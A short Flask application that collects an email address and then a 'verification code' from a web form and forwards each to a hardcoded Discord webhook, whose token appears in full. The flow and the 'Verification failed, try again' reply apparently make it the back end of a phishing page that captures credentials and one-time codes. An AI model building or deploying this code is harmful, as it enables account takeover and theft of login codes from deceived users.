from flask import Flask, request, render_template
import requests

app = Flask(__name__)

WEBHOOK_URL = "https://discord.com/api/webhooks/1458185599688114309/X9TaZmu-EfBWAHNAv8DLennJgDm2QUYnCeIxxruMIdf9BLqj1CSxRsP09NxOBLr7Sm_u"  # replace with your webhook URL

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/submit", methods=["POST"])
def submit():
    data = request.get_json()
    email = data.get("email", "").strip()
    code = data.get("code", "").strip()

    # Step 1: Only email submitted
    if email and not code:
        payload = {"content": f"Email submitted: {email}"}
        requests.post(WEBHOOK_URL, json=payload)
        return {"status": "email_received"}

    # Step 2: Email + code submitted
    elif email and code:
        payload = {"content": f"Email: {email} | Code: {code}"}
        requests.post(WEBHOOK_URL, json=payload)
        return {"status": "code_received"}

    # Empty code
    else:
        return {"status": "error", "message": "Verification failed, try again."}, 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)

